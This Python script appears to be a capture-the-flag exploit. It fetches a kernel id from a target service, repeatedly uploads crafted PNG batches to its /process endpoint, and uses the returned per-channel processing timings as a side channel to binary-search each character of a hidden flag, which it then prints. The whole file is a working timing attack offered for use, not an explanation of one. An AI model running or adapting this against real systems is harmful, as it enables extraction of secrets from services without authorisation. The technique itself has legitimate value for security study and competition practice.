#!/usr/bin/env python3
from __future__ import print_function
from sys import argv, stderr
import requests
import json
from enum import Enum

class Step(Enum):
	kLeft = 1
	kMatch = 2
	kRight = 3
	kRepeat = 4

kAlphabet = ['.', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '=', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '_']

addr = argv[1]

print("Get kernels list...")
url = 'http://%s/list' % addr
r = requests.get(url)
if r.status_code != 200:
	print("Status code %d" % r.status_code)
	exit(1)

someId = r.text.splitlines()[0]
print("Got some kernel id: " + someId)

def measure(byteIdx, symbolIdx):
	batch = {'image0' : open("pngs/white.png", 'rb').read(), 'image2' : open("pngs/black0.png", 'rb').read()}

	namePrev = "%u_%s" % (byteIdx, kAlphabet[symbolIdx - 1])
	batch[namePrev] = open("pngs/%s.png" % namePrev, 'rb').read()

	nameCur = "%u_%s" % (byteIdx, kAlphabet[symbolIdx])
	batch[nameCur] = open("pngs/%s.png" % nameCur, 'rb').read()

	nameNext = "%u_%s" % (byteIdx, kAlphabet[symbolIdx + 1])
	batch[nameNext] = open("pngs/%s.png" % nameNext, 'rb').read()
	
	url = 'http://%s/process?kernel-id=%s' % (addr, someId)
	r = requests.post(url, files=batch)
	if r.status_code != 200:
		print("Status code %d" % r.status_code)
		exit(1)

	timings = json.loads(r.text)

	average  = timings['image0']['red_channel']
	average += timings['image0']['green_channel']
	average += timings['image0']['blue_channel']
	average += timings['image0']['alpha_channel']
	noPenaltyAverage = average / 4.0
	print("Average time without penalty = %f" % noPenaltyAverage)

	average  = timings['image2']['red_channel']
	average += timings['image2']['green_channel']
	average += timings['image2']['blue_channel']
	average += timings['image2']['alpha_channel']
	penaltyAverage = average / 4.0
	print("Average time with penalty = %f" % penaltyAverage)

	if noPenaltyAverage > penaltyAverage:
		return Step.kRepeat, 0

	channelIdx = byteIdx // 8
	if channelIdx == 0:
		channelName = 'red_channel'
	elif channelIdx == 1:
		channelName = 'green_channel'
	elif channelIdx == 2:
		channelName = 'blue_channel'
	elif channelIdx == 3:
		channelName = 'alpha_channel'

	tPrev = timings[namePrev][channelName]
	tCur = timings[nameCur][channelName]
	tNext = timings[nameNext][channelName]

	print(namePrev + ": " + str(tPrev))
	print(nameCur + ": " + str(tCur))
	print(nameNext + ": " + str(tNext))

	d0 = abs(tPrev - penaltyAverage)
	d1 = abs(tPrev - noPenaltyAverage)
	prevResult = d0 > d1

	d0 = abs(tCur - penaltyAverage)
	d1 = abs(tCur - noPenaltyAverage)
	curResult = d0 > d1

	d0 = abs(tNext - penaltyAverage)
	d1 = abs(tNext - noPenaltyAverage)
	nextResult = d0 > d1

	if not prevResult and not curResult and not nextResult:
		print("Right")
		return Step.kRight, 0
	elif prevResult and curResult and nextResult:
		print("Left")
		return Step.kLeft, 0
	elif not prevResult and curResult and nextResult:
		print("Match " + kAlphabet[symbolIdx])
		return Step.kMatch, symbolIdx
	elif not prevResult and not curResult and nextResult:
		print("Match " + kAlphabet[symbolIdx + 1])
		return Step.kMatch, symbolIdx + 1
	else:
		print("Repeat")
		return Step.kRepeat, 0


def binary_search(byteIdx, l, r):
	repeatsNum = 0
	while l <= r:
		mid = l + (r - l) // 2
		print("[%c %c %c]" % (kAlphabet[l], kAlphabet[mid], kAlphabet[r]))
		result, symbolIdx = measure(byteIdx, mid)
		if result == Step.kLeft:
			r = mid - 1
		elif result == Step.kRight:
			l = mid + 1
		elif result == Step.kMatch:
			return True, symbolIdx
		else:
			if repeatsNum == 2:
				return False, 0
			repeatsNum += 1
			continue
	return False, 0


#idx = 15
#FLAG = "ABCDEFGHIJKLMNOPQRSTUVWXYZ01234="
#result, symbolIdx = binary_search(idx, 1, len(kAlphabet) - 2)
#print(result, kAlphabet[symbolIdx], FLAG[idx])
#exit(0)


flag = ""
for byteIdx in range(0,31):
	print("Byte %u" % byteIdx)
	result, symbolIdx = binary_search(byteIdx, 1, len(kAlphabet) - 2)
	flag += kAlphabet[symbolIdx]
print(flag + "=")
